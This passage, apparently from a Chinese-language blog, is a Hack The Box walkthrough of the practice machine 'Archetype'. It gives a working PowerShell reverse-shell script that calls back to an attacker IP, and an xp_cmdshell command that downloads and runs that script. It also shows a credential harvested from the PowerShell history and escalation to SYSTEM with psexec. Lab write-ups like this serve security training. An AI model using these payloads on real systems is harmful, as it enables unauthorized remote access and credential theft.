+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
+</code></pre></div><p>查看当前身份：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;whoami&#34;</span>
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
+<span style=color:#66d9ef>output</span>                                                                             
+
+<span style=color:#75715e>--------------------------------------------------------------------------------   
+</span><span style=color:#75715e></span>
+archetype<span style=color:#960050;background-color:#1e0010>\</span>sql_svc                                                                  
+
+<span style=color:#66d9ef>NULL</span> 
+</code></pre></div><p>查看是否存在开发环境：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;python&#34;</span>
+
+<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
+<span style=color:#66d9ef>output</span>                                                                             
+
+<span style=color:#75715e>--------------------------------------------------------------------------------   
+</span><span style=color:#75715e></span>
+<span style=color:#e6db74>&#39;python&#39;</span> <span style=color:#66d9ef>is</span> <span style=color:#66d9ef>not</span> recognized <span style=color:#66d9ef>as</span> an internal <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>external</span> command,                     
+
+operable program <span style=color:#66d9ef>or</span> batch file.                                                    
+
+<span style=color:#66d9ef>NULL</span> 
+</code></pre></div><h2 id=3获取用户权限>3、获取用户权限<a hidden class=anchor aria-hidden=true href=#3获取用户权限>#</a></h2>
+<p>根据之前<code>nmap</code>的扫描结果，靶机应该为Windows Server 2008 R2，可以考虑从powershell入手，建立一个powershell的反向shell文件1.ps1：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$client = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#34;10.10.14.62&#34;</span>,443);
+$stream = $client.GetStream();
+<span style=color:#66d9ef>[byte[]]</span>$bytes = 0..65535|%{0};
+<span style=color:#66d9ef>while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style=color:#f92672>-ne</span> 0)
+{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2&gt;&amp;1 | Out-String );
+$sendback2 = $sendback + <span style=color:#e6db74>&#34;# &#34;</span>;
+$sendbyte = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()};
+$client.Close()
+</code></pre></div><p>保存完文件后，不要切换目录，在当前目录起一个HTTP服务器：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#ae81ff>80</span>
+</code></pre></div><p>开启本地监听：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvvp <span style=color:#ae81ff>443</span>
+</code></pre></div><p>在数据库中执行命令下载并执行脚本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;powershell &#34;</span>IEX (<span style=color:#66d9ef>New</span><span style=color:#f92672>-</span><span style=color:#66d9ef>Object</span> Net.WebClient).DownloadString(<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#e6db74>&#34;http://10.10.14.62/1.ps1\&#34;</span>);<span style=color:#e6db74>&#34;
+</span></code></pre></div><p>下载成功后可以看到Web服务器和nc都有对应的连接信息，切换到nc窗口，回车发现拿到了靶机的shell交互：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># 查看当前用户身份</span>
+whoami
+<span style=color:#75715e># 结果</span>
+archetype\sql_svc
+
+<span style=color:#75715e># 查看当前路径</span>
+pwd
+<span style=color:#75715e># 结果</span>
+Path               
+----               
+C:\Windows\system32
+
+<span style=color:#75715e># 查看桌面文件</span>
+dir C:\Users\sql_svc\Desktop
+
+
+    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Users\sql_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        2/25/2020   6<span style=color:#960050;background-color:#1e0010>:</span>37 AM             32 user.txt
+
+<span style=color:#75715e># 查看user.txt</span>
+type C:\Users\sql_svc\Desktop\user.txt
+</code></pre></div><h2 id=4提权>4、提权<a hidden class=anchor aria-hidden=true href=#4提权>#</a></h2>
+<p>查看powershell历史记录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+<span style=color:#75715e># 结果</span>
+net.exe use T: \\Archetype\backups /user<span style=color:#960050;background-color:#1e0010>:</span>administrator MEGACORP_4dm1n!!
+exit
+</code></pre></div><p>发现administrator将文件夹\Archetype\backups映射到T盘，MEGACORP_4dm1n!!为密码。</p>
+<p>尝试使用impakcet中的psexec.py提权：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 psexec.py administrator@10.10.10.27
+
+<span style=color:#75715e># 连接信息</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Requesting shares on 10.10.10.27.....
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Found writable share ADMIN$
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploading file TPMzHnhC.exe
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Opening SVCManager on 10.10.10.27.....
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating service yQAe on 10.10.10.27.....
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting service yQAe.....
+<span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
+Microsoft Windows <span style=color:#f92672>[</span>Version 10.0.17763.107<span style=color:#f92672>]</span>
+<span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2018</span> Microsoft Corporation. All rights reserved.
+
+<span style=color:#75715e># 查看当前身份</span>
+C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;whoami
+nt authority<span style=color:#ae81ff>\s</span>ystem
+
+<span style=color:#75715e># 查看桌面目录</span>
+dir C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
+<span style=color:#75715e># 结果</span>
+Directory of C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
+
+01/20/2020  06:42 AM    &lt;DIR&gt;          .
+01/20/2020  06:42 AM    &lt;DIR&gt;          ..
+02/25/2020  07:36 AM                <span style=color:#ae81ff>32</span> root.txt
+               <span style=color:#ae81ff>1</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>             <span style=color:#ae81ff>32</span> bytes
+               <span style=color:#ae81ff>2</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  33,833,361,408 bytes free
+               
+<span style=color:#75715e># 查看root.txt</span>
+type C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\r</span>oot.txt
+</code></pre></div><blockquote>
+<p>本文链接：[HTB-Starting Point | Atmet (oopsdc.tk)](<a href=https://oopsdc.tk/post/HTB-Starting>https://oopsdc.tk/post/HTB-Starting</a> Point/)</p>
+<p>文章许可：本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p>
+</blockquote>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://oopsdc.tk/tags/hack-the-box/>Hack The Box</a></li>
+</ul>
+<nav class=paginav>
+<a class=next href=https://oopsdc.tk/post/lxrunoffline/>
+<span class=title>Next Page »</span>
+<br>
+<span>LxRunOffline使用手册</span>
+</a>
+</nav>
+</footer>
+</article>
+</main><footer class=footer>
+<span>&copy; 2021 <a href=https://oopsdc.tk/>Atmet</a></span>
+<span>&#183;</span>
+<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
+<span>&#183;</span>
+<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span>
+<script src=https://utteranc.es/client.js repo=oopsdc/utterances issue-term=title theme=github-light crossorigin=anonymous async></script>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
+<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</button>
+</a>
+<script defer src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+</body>
+</html>
